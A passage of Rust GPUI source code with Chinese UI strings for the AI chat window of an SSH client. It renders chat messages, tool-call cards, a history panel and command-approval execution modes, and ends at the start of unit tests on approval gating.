                            cx.theme().warning
                        } else {
                            cx.theme().muted_foreground
                        })
                        .child(format!("{} {summary}", if open { "▾" } else { "▸" })),
                )
                .on_click(move |_, _, cx| {
                    toggle_entity.update(cx, |this, cx| {
                        this.chat.toggle_group(message_index, first);
                        cx.notify();
                    });
                }),
        );
        if open {
            for index in ids {
                group = group.child(self.tool_card(
                    message_index,
                    *index,
                    &message.tools[*index],
                    entity.clone(),
                    cx,
                ));
            }
        }
        group.into_any_element()
    }

    /// 卡片上的「查看终端」：切到这台主机的终端标签（还没连上、正在连也可以，能看到连接过程）。
    fn view_terminal(&mut self, exec: &ExecInfo, cx: &mut Context<Self>) {
        agent_setup::request_view_terminal(exec.target_id.clone(), exec.session_id.clone());
        cx.notify();
    }

    /// 「思考中」要不要重画：显示着的时候，已等秒数变了才画。
    fn thinking_tick(&mut self) -> bool {
        let visible = self.real
            && (self.chat.thinking_visible()
                || (self.chat.real_running && self.chat.retry.is_some()));
        let sec = visible
            .then(|| {
                self.chat
                    .turn_started
                    .map(|since| since.elapsed().as_secs())
            })
            .flatten();
        if sec == self.thinking_sec {
            return false;
        }
        self.thinking_sec = sec;
        true
    }

    /// 消息区底部的「· · · 12秒 · 思考中」，重试时下面带一行提示（0.2.14 `ThinkingIndicator`）。
    fn thinking_row(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
        let retrying = self.chat.real_running && self.chat.retry.is_some();
        if !self.real || !(self.chat.thinking_visible() || retrying) {
            return None;
        }
        let since = self.chat.turn_started?;
        let elapsed = agent_tools::elapsed_text(since.elapsed().as_millis() as u64);
        let retry = self
            .chat
            .retry
            .as_ref()
            .filter(|_| self.chat.real_running)
            .map(|notice| redact_paths(&agent_tools::retry_text(notice)));
        Some(
            v_flex()
                .id("agent-chat-thinking")
                .gap_1()
                .child(
                    div()
                        .text_xs()
                        .text_color(cx.theme().muted_foreground)
                        .child(format!("· · ·  {elapsed} · 思考中")),
                )
                .when_some(retry, |column, text| {
                    column.child(
                        div()
                            .id("agent-chat-retrying")
                            .text_xs()
                            .text_color(cx.theme().warning)
                            .child(text),
                    )
                })
                .into_any_element(),
        )
    }

    /// 历史面板：列表 / 只读查看；替代消息区显示。
    fn history_panel(&self, cx: &mut Context<Self>) -> AnyElement {
        match &self.history {
            HistoryPanel::Closed => div().into_any_element(),
            HistoryPanel::List => self.history_list(cx),
            HistoryPanel::Detail(record) => self.history_detail(record.as_ref(), cx),
        }
    }

    /// 历史列表：标题、更新时间、主机、消息数，以及查看 / 继续 / 删除。
    fn history_list(&self, cx: &mut Context<Self>) -> AnyElement {
        let entity = cx.entity();
        let refresh_entity = entity.clone();
        let close_entity = entity.clone();
        let now = now_ms();
        let mut rows = Vec::with_capacity(self.history_rows.len());
        for summary in &self.history_rows {
            rows.push(self.history_row(summary, now, entity.clone(), cx));
        }
        let mut panel = v_flex()
            .id("agent-chat-history-list")
            .flex_1()
            .min_h_0()
            .gap_2()
            .p_2()
            .overflow_y_scroll()
            .border_1()
            .border_color(cx.theme().border)
            .child(
                h_flex()
                    .gap_2()
                    .items_center()
                    .child(
                        div()
                            .text_sm()
                            .font_weight(FontWeight::SEMIBOLD)
                            .child("历史会话"),
                    )
                    .child(
                        div()
                            .text_xs()
                            .text_color(cx.theme().muted_foreground)
                            .child(self.agent.label()),
                    )
                    .child(div().flex_1())
                    .child(
                        Button::new("agent-chat-history-refresh")
                            .label("刷新")
                            .compact()
                            .on_click(move |_, _, cx| {
                                refresh_entity.update(cx, |this, cx| {
                                    this.refresh_history();
                                    cx.notify();
                                });
                            }),
                    )
                    .child(
                        Button::new("agent-chat-history-close")
                            .label("关闭")
                            .compact()
                            .on_click(move |_, _, cx| {
                                close_entity.update(cx, |this, cx| {
                                    this.close_history();
                                    cx.notify();
                                });
                            }),
                    ),
            );
        if let Some(error) = &self.history_error {
            panel = panel.child(
                div()
                    .text_xs()
                    .text_color(cx.theme().danger)
                    .child(redact_paths(error)),
            );
        }
        if self.history_rows.is_empty() && self.history_error.is_none() {
            panel = panel.child(
                div()
                    .p_2()
                    .text_sm()
                    .text_color(cx.theme().muted_foreground)
                    .child(HISTORY_EMPTY),
            );
        }
        panel.children(rows).into_any_element()
    }

    /// 历史列表的一行。
    fn history_row(
        &self,
        summary: &HistorySummary,
        now: u64,
        entity: Entity<Self>,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let armed = self.history_armed.as_deref() == Some(summary.id.as_str());
        let view_entity = entity.clone();
        let continue_entity = entity.clone();
        let delete_entity = entity.clone();
        let cancel_entity = entity;
        let view_id = summary.id.clone();
        let continue_id = summary.id.clone();
        let delete_id = summary.id.clone();
        let button_suffix = summary.id.clone();
        let title = history_title(&summary.title).to_owned();
        // 锚定的主机单独成一个小标签（一眼看出这条对话是在哪台主机上聊的），其余是时间和消息数。
        let host = history_host(summary.anchor.as_ref(), summary.host_label.as_deref())
            .map(|host| host.trim().to_owned())
            .filter(|host| !host.is_empty());
        let meta = history_meta(summary.updated_at, None, summary.message_count, now);
        v_flex()
            .gap_1()
            .p_2()
            .rounded_md()
            .border_1()
            .border_color(if armed {
                cx.theme().danger
            } else {
                cx.theme().border
            })
            .bg(cx.theme().tab_bar)
            .child(
                h_flex()
                    .gap_2()
                    .items_center()
                    .child(
                        h_flex()
                            .flex_1()
                            .min_w_0()
                            .gap_2()
                            .items_center()
                            .child(
                                div()
                                    .min_w_0()
                                    .truncate()
                                    .text_sm()
                                    .font_weight(FontWeight::SEMIBOLD)
                                    .child(title),
                            )
                            .when(summary.resumable, |row| {
                                row.child(
                                    div()
                                        .px_1()
                                        .py_0p5()
                                        .rounded_sm()
                                        .bg(cx.theme().muted)
                                        .text_xs()
                                        .text_color(cx.theme().success)
                                        .child(HISTORY_RESUMABLE),
                                )
                            }),
                    )
                    .child(
                        Button::new(format!("agent-chat-history-view-{button_suffix}"))
                            .label("查看")
                            .compact()
                            .on_click(move |_, _, cx| {
                                view_entity.update(cx, |this, cx| {
                                    this.open_history(&view_id, cx);
                                });
                            }),
                    )
                    .child(
                        Button::new(format!("agent-chat-history-continue-{button_suffix}"))
                            .label("继续")
                            .compact()
                            .disabled(!summary.resumable)
                            .on_click(move |_, _, cx| {
                                continue_entity.update(cx, |this, cx| {
                                    this.continue_history(&continue_id, cx);
                                });
                            }),
                    )
                    .child(
                        Button::new(format!("agent-chat-history-delete-{button_suffix}"))
                            .label(if armed {
                                HISTORY_CONFIRM_DELETE
                            } else {
                                "删除"
                            })
                            .compact()
                            .on_click(move |_, _, cx| {
                                delete_entity.update(cx, |this, cx| {
                                    this.delete_history(&delete_id, cx);
                                });
                            }),
                    )
                    .when(armed, |row| {
                        row.child(
                            Button::new(format!("agent-chat-history-cancel-{button_suffix}"))
                                .label("取消")
                                .compact()
                                .on_click(move |_, _, cx| {
                                    cancel_entity.update(cx, |this, cx| {
                                        this.disarm_history_delete(cx);
                                    });
                                }),
                        )
                    }),
            )
            .child(
                h_flex()
                    .gap_2()
                    .items_center()
                    .text_xs()
                    .text_color(cx.theme().muted_foreground)
                    .children(host.map(|host| {
                        div()
                            .id(SharedString::from(format!("history-host-{button_suffix}")))
                            .max_w(px(140.0))
                            .truncate()
                            .px_1p5()
                            .rounded_md()
                            .border_1()
                            .border_color(cx.theme().border)
                            .text_color(cx.theme().foreground)
                            .child(host)
                    }))
                    .child(meta),
            )
            .into_any_element()
    }

    /// 只读查看一条历史会话；助手正文仍用 Markdown 渲染。
    fn history_detail(&self, record: &HistoryRecord, cx: &mut Context<Self>) -> AnyElement {
        let back_entity = cx.entity();
        let now = now_ms();
        let meta = history_meta(
            record.updated_at,
            history_host(record.anchor.as_ref(), record.host_label.as_deref()).as_deref(),
            record.messages.len(),
            now,
        );
        let mut panel = v_flex()
            .id("agent-chat-history-detail")
            .flex_1()
            .min_h_0()
            .gap_2()
            .p_2()
            .overflow_y_scroll()
            .border_1()
            .border_color(cx.theme().border)
            .child(
                h_flex()
                    .gap_2()
                    .items_center()
                    .child(
                        Button::new("agent-chat-history-back")
                            .label("返回列表")
                            .compact()
                            .on_click(move |_, _, cx| {
                                back_entity.update(cx, |this, cx| {
                                    this.history = HistoryPanel::List;
                                    this.history_armed = None;
                                    this.history_error = None;
                                    cx.notify();
                                });
                            }),
                    )
                    .child(
                        h_flex()
                            .flex_1()
                            .min_w_0()
                            .gap_2()
                            .items_center()
                            .child(
                                div()
                                    .min_w_0()
                                    .truncate()
                                    .text_sm()
                                    .font_weight(FontWeight::SEMIBOLD)
                                    .child(history_title(&record.title).to_owned()),
                            )
                            .when(record.agent_session_id.is_some(), |row| {
                                row.child(
                                    div()
                                        .px_1()
                                        .py_0p5()
                                        .rounded_sm()
                                        .bg(cx.theme().muted)
                                        .text_xs()
                                        .text_color(cx.theme().success)
                                        .child(HISTORY_RESUMABLE),
                                )
                            }),
                    ),
            )
            .child(
                div()
                    .text_xs()
                    .text_color(cx.theme().muted_foreground)
                    .child(meta),
            );
        if record.messages.is_empty() {
            panel = panel.child(
                div()
                    .p_2()
                    .text_sm()
                    .text_color(cx.theme().muted_foreground)
                    .child(HISTORY_NO_MESSAGES),
            );
        }
        let start = visible_start(record.messages.len(), self.history_shown);
        if start > 0 {
            let more_entity = cx.entity();
            panel = panel.child(
                h_flex()
                    .gap_2()
                    .items_center()
                    .child(
                        div()
                            .text_xs()
                            .text_color(cx.theme().muted_foreground)
                            .child(format!("较早的 {start} 条消息没有显示")),
                    )
                    .child(
                        Button::new("agent-chat-history-older")
                            .label("显示更早的消息")
                            .compact()
                            .on_click(move |_, _, cx| {
                                more_entity.update(cx, |this, cx| {
                                    this.history_shown += MESSAGES_PER_PAGE;
                                    cx.notify();
                                });
                            }),
                    ),
            );
        }
        for (index, message) in record.messages.iter().enumerate().skip(start) {
            panel = panel.child(self.history_message(index, message, cx));
        }
        panel.into_any_element()
    }

    /// 历史里的一条消息：用户 / 助手 / 工具，只读。
    fn history_message(
        &self,
        index: usize,
        message: &HistoryMessage,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        match message {
            HistoryMessage::User { text } => h_flex()
                .w_full()
                .justify_end()
                .child(
                    div()
                        .max_w(::gpui::px(680.0))
                        .p_2()
                        .rounded_md()
                        .bg(cx.theme().primary)
                        .text_color(cx.theme().primary_foreground)
                        .text_sm()
                        .child(text.clone()),
                )
                .into_any_element(),
            HistoryMessage::Assistant { text } => v_flex()
                .w_full()
                .gap_1()
                .child(
                    div()
                        .text_xs()
                        .text_color(cx.theme().muted_foreground)
                        .child("助手"),
                )
                .child(
                    TextView::markdown(("agent-chat-history-markdown", index), text.clone())
                        .text_sm()
                        .selectable(true)
                        .selection_format(SelectionFormat::Source)
                        // 和历史对话一样：所有图片都换成不存在的内嵌资源。
                        .image_source(|_| {
                            ImageSource::Resource(Resource::Embedded(
                                "zssh-no-remote-images".into(),
                            ))
                        })
                        .on_link_click({
                            let link_entity = cx.entity();
                            move |url, event, _, cx| {
                                if !link_click_opens(event) {
                                    return;
                                }
                                let url = url.to_string();
                                link_entity.update(cx, |this, cx| this.open_link(&url, cx));
                            }
                        })
                        .code_block_actions(move |code_block, _, _| {
                            let code = code_block_copy_text(&code_block.code());
                            Button::new(format!("agent-chat-history-copy-code-{index}"))
                                .label("复制")
                                .compact()
                                .on_click(move |_, _, cx| {
                                    cx.write_to_clipboard(ClipboardItem::new_string(code.clone()));
                                })
                        })
                        .table_actions(move |table, _, _| {
                            let tsv = table_tsv(&table.headers, &table.rows);
                            h_flex().justify_end().child(
                                Button::new(format!("agent-chat-history-copy-table-{index}"))
                                    .label("复制表格")
                                    .compact()
                                    .on_click(move |_, _, cx| {
                                        cx.write_to_clipboard(ClipboardItem::new_string(
                                            tsv.clone(),
                                        ));
                                    }),
                            )
                        }),
                )
                .into_any_element(),
            HistoryMessage::Tool {
                tool,
                input,
                output,
                status,
            } => {
                let mut card = v_flex()
                    .gap_1()
                    .p_2()
                    .rounded_md()
                    .border_1()
                    .border_color(
                        if matches!(status.as_str(), "error" | "rejected" | "stopped") {
                            cx.theme().danger
                        } else {
                            cx.theme().border
                        },
                    )
                    .bg(cx.theme().tab_bar)
                    .child(
                        h_flex()
                            .gap_2()
                            .items_center()
                            .child(
                                div()
                                    .text_sm()
                                    .font_weight(FontWeight::SEMIBOLD)
                                    .child(tool.clone()),
                            )
                            .child(
                                div()
                                    .text_xs()
                                    .text_color(cx.theme().muted_foreground)
                                    .child(history_tool_status(status)),
                            ),
                    );
                let summary = content_preview(&input.to_string());
                if !summary.is_empty() && summary != "null" {
                    card = card.child(
                        div()
                            .text_xs()
                            .text_color(cx.theme().muted_foreground)
                            .child(format!("参数：{summary}")),
                    );
                }
                if !output.trim().is_empty() {
                    let full = self.history_full.contains(&index);
                    let clip = clip_text(output, OUTPUT_PREVIEW_LINES, OUTPUT_PREVIEW_CHARS);
                    let shown = if full {
                        output.clone()
                    } else {
                        clip.text.clone()
                    };
                    card = card.child(
                        div()
                            .id(("agent-chat-history-output", index))
                            .p_2()
                            .rounded_sm()
                            .border_1()
                            .border_color(cx.theme().border)
                            .bg(cx.theme().background)
                            .text_xs()
                            .when(full, |boxed| {
                                boxed.max_h(::gpui::px(320.0)).overflow_y_scroll()
                            })
                            .child(shown),
                    );
                    if clip.clipped {
                        let toggle_entity = cx.entity();
                        card = card.child(
                            h_flex()
                                .gap_2()
                                .items_center()
                                .child(
                                    div()
                                        .text_xs()
                                        .text_color(cx.theme().muted_foreground)
                                        .child(format!(
                                            "输出较长（共 {} 行、{} 个字符）",
                                            clip.total_lines, clip.total_chars
                                        )),
                                )
                                .child(
                                    Button::new(format!("agent-chat-history-output-more-{index}"))
                                        .label(if full { "收起" } else { "显示全部" })
                                        .compact()
                                        .on_click(move |_, _, cx| {
                                            toggle_entity.update(cx, |this, cx| {
                                                if !this.history_full.remove(&index) {
                                                    this.history_full.insert(index);
                                                }
                                                cx.notify();
                                            });
                                        }),
                                ),
                        );
                    }
                }
                card.into_any_element()
            }
        }
    }
}

impl AgentChatDemo {
    /// 消息区（或历史面板，二选一）：独立窗口和嵌在主窗口里的面板共用同一份。
    fn conversation_body(&mut self, cx: &mut Context<Self>) -> AnyElement {
        let entity = cx.entity();
        let older_entity = entity.clone();
        let message_count = self.chat.messages.len();
        // 长对话只画最后一页：每帧为全部消息构建元素（含 Markdown 解析）会越用越卡。
        let first_shown = visible_start(message_count, self.shown_messages);

        let messages = self
            .chat
            .messages
            .iter()
            .enumerate()
            .skip(first_shown)
            .map(|(index, message)| match message {
                ChatMessage::User(text) => h_flex()
                    .w_full()
                    .min_w_0()
                    .justify_end()
                    .child(
                        div()
                            .max_w(::gpui::px(680.0))
                            .min_w_0()
                            .p_2()
                            .rounded_md()
                            .bg(cx.theme().primary)
                            .text_color(cx.theme().primary_foreground)
                            .text_sm()
                            .child(text.clone()),
                    )
                    .into_any_element(),
                ChatMessage::Assistant(message) => {
                    let toggle_entity = entity.clone();
                    let raw_entity = entity.clone();
                    let mode = body_mode(message);
                    let mut block = v_flex().w_full().gap_1().child(
                        h_flex()
                            .gap_2()
                            .items_center()
                            .child(
                                div()
                                    .text_xs()
                                    .text_color(cx.theme().muted_foreground)
                                    .child("助手"),
                            )
                            .when(message.stopped, |row| {
                                row.child(
                                    div()
                                        .text_xs()
                                        .text_color(cx.theme().danger)
                                        .child("已停止"),
                                )
                            })
                            .child(
                                Button::new(format!("agent-chat-raw-{index}"))
                                    .label(mode.toggle_label())
                                    .compact()
                                    .toggled(mode == BodyMode::Raw)
                                    .on_click(move |_, _, cx| {
                                        raw_entity.update(cx, |this, cx| {
                                            this.chat.toggle_raw(index);
                                            cx.notify();
                                        });
                                    }),
                            ),
                    );

                    for notice in &message.notices {
                        block = block.child(
                            div()
                                .text_xs()
                                .text_color(if notice.error {
                                    cx.theme().danger
                                } else {
                                    cx.theme().warning
                                })
                                .child(redact_paths(&notice.text)),
                        );
                    }

                    if !message.reasoning.is_empty() {
                        let expanded = message.reasoning_expanded;
                        let reasoning = message.reasoning.clone();
                        block = block.child(
                            v_flex()
                                .gap_1()
                                .child(
                                    h_flex()
                                        .id(("agent-chat-reasoning", index))
                                        .cursor_pointer()
                                        .items_center()
                                        .child(
                                            div()
                                                .text_xs()
                                                .text_color(cx.theme().muted_foreground)
                                                .child(if expanded {
                                                    "思考 ▾"
                                                } else {
                                                    "思考 ▸"
                                                }),
                                        )
                                        .on_click(move |_, _, cx| {
                                            toggle_entity.update(cx, |this, cx| {
                                                this.chat.toggle_reasoning(index);
                                                cx.notify();
                                            });
                                        }),
                                )
                                .when(expanded, |section| {
                                    section.child(
                                        div()
                                            .pl_2()
                                            .text_xs()
                                            .text_color(cx.theme().muted_foreground)
                                            .child(reasoning),
                                    )
                                }),
                        );
                    }

                    if let Some(body) = self.assistant_body(entity.clone(), index, message, mode) {
                        block = block.child(body);
                    }

                    let views: Vec<CallView> = message.tools.iter().map(ToolCard::view).collect();
                    for row in agent_tools::group_calls(&views) {
                        match row {
                            ToolRow::Card(tool_index) => {
                                block = block.child(self.tool_card(
                                    index,
                                    tool_index,
                                    &message.tools[tool_index],
                                    entity.clone(),
                                    cx,
                                ));
                            }
                            ToolRow::Progress(tool_index) => {
                                let card = &message.tools[tool_index];
                                block = block.child(
                                    div()
                                        .text_xs()
                                        .text_color(cx.theme().muted_foreground)
                                        .child(format!(
                                            "◔ {}",
                                            redact_paths(&agent_tools::progress_text(
                                                &card.tool,
                                                &card.input_json()
                                            ))
                                        )),
                                );
                            }
                            ToolRow::Group(ids) => {
                                block = block.child(self.tool_group(
                                    index,
                                    message,
                                    &ids,
                                    entity.clone(),
                                    cx,
                                ));
                            }
                        }
                    }

                    block.into_any_element()
                }
            })
            .collect::<Vec<_>>();

        let empty = message_count == 0;
        // 真实模式下智能体没找到 / 没登录 / 还在检测：整块提示替代空状态（0.2.14 同）。
        let unavailable = if self.real && empty {
            self.unavailable_view(cx)
        } else {
            None
        };
        let message_area = v_flex()
            .id("agent-chat-messages")
            .flex_1()
            .min_h_0()
            .gap_2()
            .p_2()
            .overflow_y_scroll()
            .track_scroll(&self.scroll)
            .border_1()
            .border_color(cx.theme().border)
            .when(empty && unavailable.is_none(), |area| {
                area.child(
                    div()
                        .p_2()
                        .text_sm()
                        .text_color(cx.theme().muted_foreground)
                        .child(if self.real {
                            format!("输入一条消息，开始与 {} 对话。", self.agent.label())
                        } else {
                            "输入一条消息，开始离线演示。".to_owned()
                        }),
                )
            })
            .children(unavailable)
            .when(first_shown > 0, |area| {
                area.child(
                    h_flex()
                        .gap_2()
                        .items_center()
                        .child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().muted_foreground)
                                .child(format!("较早的 {first_shown} 条消息没有显示")),
                        )
                        .child(
                            Button::new("agent-chat-older")
                                .label("显示更早的消息")
                                .compact()
                                .on_click(move |_, _, cx| {
                                    older_entity.update(cx, |this, cx| {
                                        this.shown_messages += MESSAGES_PER_PAGE;
                                        cx.notify();
                                    });
                                }),
                        ),
                )
            })
            .children(messages)
            .children(self.thinking_row(cx))
            .children(self.queue_block(cx));

        // 历史面板和消息区二选一：面板打开时替代消息区，输入框和底部提示照旧。
        let body_area: AnyElement = if self.history == HistoryPanel::Closed {
            message_area.into_any_element()
        } else {
            self.history_panel(cx)
        };
        body_area
    }
}

impl Render for AgentChatDemo {
    fn render(&mut self, window: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
        // 嵌在主窗口右侧面板里时画紧凑版（标题由面板外壳画），独立窗口画完整版。
        if self.embed.is_some() {
            return self.render_embedded(window, cx);
        }
        self.render_window(cx).into_any_element()
    }
}

impl AgentChatDemo {
    fn render_window(&mut self, cx: &mut Context<Self>) -> impl IntoElement {
        let entity = cx.entity();
        let mode_entity = entity.clone();
        let new_entity = entity.clone();
        let sample_entity = entity.clone();
        let stop_entity = entity.clone();
        let send_entity = entity.clone();
        let real_entity = entity.clone();
        let agent_entity = entity.clone();
        let model_entity = entity.clone();
        let history_entity = entity.clone();
        let running = self.chat.is_running();
        let blocked = self.real && self.availability().blocks_input();
        let banners = if self.real {
            self.agent_banners(cx)
        } else {
            Vec::new()
        };
        let body_area = self.conversation_body(cx);

        // 目标主机：每台一个开关，默认一台都不选，可以增也可以减。
        let host_chips: Vec<AnyElement> = self
            .hosts
            .iter()
            .map(|host| {
                let host_id = host.id;
                let chosen = self.selected_hosts.contains(&host_id);
                let chip_entity = entity.clone();
                Button::new(format!("agent-chat-host-{host_id}"))
                    .label(host.name.clone())
                    .compact()
                    .toggled(chosen)
                    .on_click(move |_, _, cx| {
                        chip_entity.update(cx, |this, cx| this.toggle_host(host_id, cx));
                    })
                    .into_any_element()
            })
            .collect();
        let no_hosts_selected = self.selected_hosts.is_empty();

        v_flex()
            .size_full()
            .p_3()
            .gap_2()
            .track_focus(&self.focus)
            .bg(cx.theme().background)
            .child(
                h_flex()
                    .gap_2()
                    .items_center()
                    .child(div().text_lg().child("AI 对话"))
                    .when(!self.real, |row| {
                        row.child(
                            div()
                                .px_2()
                                .py_0p5()
                                .rounded_full()
                                .border_1()
                                .border_color(cx.theme().border)
                                .bg(cx.theme().muted)
                                .text_xs()
                                .text_color(cx.theme().muted_foreground)
                                .child("离线演示"),
                        )
                    })
                    .when(demo_toggle_available(), |row| {
                        row.child(
                            Button::new("agent-chat-real")
                                .label(if self.real {
                                    "离线演示"
                                } else {
                                    "真实智能体"
                                })
                                .compact()
                                .on_click(move |_, _, cx| {
                                    real_entity.update(cx, |this, cx| this.toggle_real(cx));
                                }),
                        )
                    })
                    .when(self.real, |row| {
                        row.child(
                            Button::new("agent-chat-agent")
                                .label(format!("智能体：{}", self.agent.label()))
                                .compact()
                                .on_click(move |_, _, cx| {
                                    agent_entity.update(cx, |this, cx| this.cycle_agent(cx));
                                }),
                        )
                        .child(
                            Button::new("agent-chat-model")
                                .label(model_label(&self.models, self.model_index))
                                .compact()
                                .on_click(move |_, _, cx| {
                                    model_entity.update(cx, |this, cx| this.cycle_model(cx));
                                }),
                        )
                    })
                    .child(div().flex_1())
                    .child(
                        Button::new("agent-chat-mode")
                            .label(format!("执行模式：{}", mode_label(self.current_mode())))
                            .compact()
                            .on_click(move |_, _, cx| {
                                mode_entity.update(cx, |this, cx| this.cycle_mode(cx));
                            }),
                    )
                    .child(
                        Button::new("agent-chat-new")
                            .label("新对话")
                            .compact()
                            .on_click(move |_, _, cx| {
                                new_entity.update(cx, |this, cx| this.new_conversation(cx));
                            }),
                    )
                    .child(
                        Button::new("agent-chat-markdown-sample")
                            .label("Markdown 示例")
                            .compact()
                            .on_click(move |_, _, cx| {
                                sample_entity.update(cx, |this, cx| {
                                    this.append_markdown_sample(cx);
                                });
                            }),
                    )
                    .child(
                        Button::new("agent-chat-history")
                            .label("历史")
                            .compact()
                            .toggled(self.history != HistoryPanel::Closed)
                            .on_click(move |_, _, cx| {
                                history_entity.update(cx, |this, cx| this.toggle_history(cx));
                            }),
                    )
                    .child(
                        Button::new("agent-chat-stop")
                            .label("停止")
                            .compact()
                            .disabled(!running)
                            .on_click(move |_, _, cx| {
                                stop_entity.update(cx, |this, cx| this.stop(cx));
                            }),
                    ),
            )
            .when(self.real, |column| {
                column.child(
                    h_flex()
                        .gap_2()
                        .items_center()
                        .flex_wrap()
                        .child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().muted_foreground)
                                .child("目标主机："),
                        )
                        .children(host_chips)
                        .when(self.hosts.is_empty(), |row| {
                            row.child(
                                div()
                                    .text_xs()
                                    .text_color(cx.theme().warning)
                                    .child("主机库里还没有主机：先在主机库添加一台。"),
                            )
                        })
                        .when(!self.hosts.is_empty() && no_hosts_selected, |row| {
                            row.child(
                                div()
                                    .text_xs()
                                    .text_color(cx.theme().warning)
                                    .child(NO_HOST_HINT),
                            )
                        }),
                )
            })
            .children(banners)
            .child(body_area)
            .child(
                h_flex()
                    .gap_2()
                    .items_end()
                    .child(
                        Textarea::new(&self.input)
                            .flex_1()
                            .h(::gpui::px(72.0))
                            .disabled(running || blocked),
                    )
                    .child(
                        Button::new("agent-chat-send")
                            .label("发送")
                            .disabled(running || blocked)
                            .on_click(move |_, window, cx| {
                                send_entity.update(cx, |this, cx| this.send(window, cx));
                            }),
                    ),
            )
            .child(
                v_flex()
                    .gap_1()
                    .when(self.real, |footer| {
                        footer
                            .child(
                                div()
                                    .text_xs()
                                    .text_color(cx.theme().muted_foreground)
                                    .child(
                                        "第一条消息发出时才启动智能体；\
                                         需要确认的命令会出现在对话里，看清全文后点「允许」或「拒绝」。",
                                    ),
                            )
                            .child(
                                div()
                                    .text_xs()
                                    .text_color(cx.theme().muted_foreground)
                                    .child(
                                        "执行模式由工具桥读取设置库：逐条确认 = 每条命令都确认；\
                                         只读自动 = 只读命令直接执行；全部放行 = 不再确认。",
                                    ),
                            )
                    })
                    .when(!self.real, |footer| {
                        footer
                            .child(
                                div()
                                    .text_xs()
                                    .text_color(cx.theme().muted_foreground)
                                    .child(
                                        "离线脚本演示（调试版）：不启动智能体、不调用模型、不发起网络请求。",
                                    ),
                            )
                            .child(
                                div()
                                    .text_xs()
                                    .text_color(cx.theme().muted_foreground)
                                    .child(
                                        "执行模式只影响本窗口的演示脚本，不会写设置库：逐条确认 = 每个工具都确认；\
                                         只读自动 = 只读命令直接执行；全部放行 = 不再确认。",
                                    ),
                            )
                    })
                    .when_some(self.resume_notice.clone(), |footer, notice| {
                        footer.child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().success)
                                .child(notice),
                        )
                    })
                    .when_some(self.link_notice.clone(), |footer, notice| {
                        footer.child(
                            div()
                                .text_xs()
                                .text_color(if notice.error {
                                    cx.theme().danger
                                } else {
                                    cx.theme().success
                                })
                                .child(notice.text),
                        )
                    })
                    .when_some(self.history_save.clone(), |footer, notice| {
                        footer.child(
                            div()
                                .text_xs()
                                .text_color(if notice.error {
                                    cx.theme().danger
                                } else {
                                    cx.theme().success
                                })
                                .child(redact_paths(&notice.text)),
                        )
                    })
                    .when_some(self.footer_error.clone(), |footer, err| {
                        footer.child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().danger)
                                .child(redact_paths(&err)),
                        )
                    })
                    .when_some(self.settings_error.clone(), |footer, err| {
                        footer.child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().danger)
                                .child(redact_paths(&err)),
                        )
                    })
                    .when_some(self.storage_error.clone(), |footer, err| {
                        footer.child(
                            div()
                                .text_xs()
                                .text_color(cx.theme().danger)
                                .child(redact_paths(&format!(
                                    "设置库不可用：{err}；执行模式改动不会保存。"
                                ))),
                        )
                    }),
            )
    }
}

impl Drop for AgentChatDemo {
    fn drop(&mut self) {
        // 窗口关掉：显式 shutdown 会话、收回回合计数和「AI 使用中」标记。
        self.teardown();
    }
}

/// 打开 AI 对话窗口；同一个进程可以开多个。
pub fn open_agent_chat_window(cx: &mut App) {
    let options = WindowOptions {
        window_bounds: Some(WindowBounds::centered(
            size(::gpui::px(920.0), ::gpui::px(640.0)),
            cx,
        )),
        focus: true,
        ..Default::default()
    };
    let _ = cx.open_window(options, |window, cx| {
        let view = cx.new(|cx| AgentChatDemo::new(window, cx));
        window.set_window_title("AI 对话");
        window.focus(&view.read(cx).input_focus_handle(cx), cx);
        view
    });
}

#[cfg(test)]
mod tests {
    // 不写 `use super::*`：父模块 glob 进来的 `gpui_kit::test` 会盖掉内置的
    // `#[test]` 属性宏，展开时直接撞递归上限。
    use super::{
        ApprovalDetail, ApprovalState, AssistantMessage, BodyMode, ChatMessage, ChatState,
        DemoInput, DemoTool, ExecMode, HISTORY_RESUMABLE, HistoryAnchor, HistoryMessage,
        HistoryRecord, HistoryStore, HostChoice, MARKDOWN_SAMPLE, ModelChoice, RAW_NO_BODY,
        ToolCard, ToolInput, ToolStatus, body_markdown, body_mode, clipped_body,
        code_block_copy_text, content_preview, continue_conversation, demo_toggle_available,
        format_history_time, history_host, history_id_for_turn, history_meta, history_title,
        history_tool_status, host_names_label, link_click_notice, load_exec_mode, mode_label,
        mode_setting, model_choices, model_label, new_history_id, next_mode, next_mode_plan,
        next_model_index, raw_markdown_block, redact_tool_input, requires_approval,
        resume_session_id, save_exec_mode, selected_targets, start_in_real_mode, table_tsv,
        toggle_host_selection, tool_history_status,
    };
    use crate::agent_text::{BODY_PREVIEW_CHARS, DIFF_FOLD_LIMIT, fold_diff};
    use crate::agent_tools::{self, ToolRow};
    use serde_json::json;
    use zssh_core::ai::agent::discovery::CLAUDE;
    use zssh_core::ai::agent::{AgentEvent, AgentModel, AgentModelCatalog};
    use zssh_core::ai::bridge::{ApprovalRequest, ExecTargetReport};
    use zssh_core::ai::protocol::host_target_id;
    use zssh_core::ai::safety::DangerLevel;
    use zssh_core::store::Database;

    fn started() -> ChatState {
        let mut state = ChatState::default();
        assert!(state.start_turn("测试一下"));
        state
    }

    fn assistant(state: &ChatState) -> &AssistantMessage {
        state
            .messages
            .iter()
            .find_map(|message| match message {
                ChatMessage::Assistant(message) => Some(message),
                ChatMessage::User(_) => None,
            })
            .expect("应该有一条助手消息")
    }

    fn advance_n(state: &mut ChatState, count: usize, mode: ExecMode) {
        for _ in 0..count {
            assert!(state.advance(mode), "脚本应该继续推进");
        }
    }

    #[test]
    fn read_only_and_write_tools_are_gated_by_mode() {
        assert!(requires_approval(DemoTool::TerminalExec, ExecMode::Manual));
        assert!(!requires_approval(
            DemoTool::TerminalExec,
            ExecMode::ReadOnly
        ));
        assert!(!requires_approval(DemoTool::TerminalExec, ExecMode::Auto));
        assert!(requires_approval(DemoTool::WriteFile, ExecMode::Manual));
        assert!(requires_approval(DemoTool::WriteFile, ExecMode::ReadOnly));
        assert!(!requires_approval(DemoTool::WriteFile, ExecMode::Auto));

        let mut state = started();
        advance_n(&mut state, 3, ExecMode::ReadOnly);
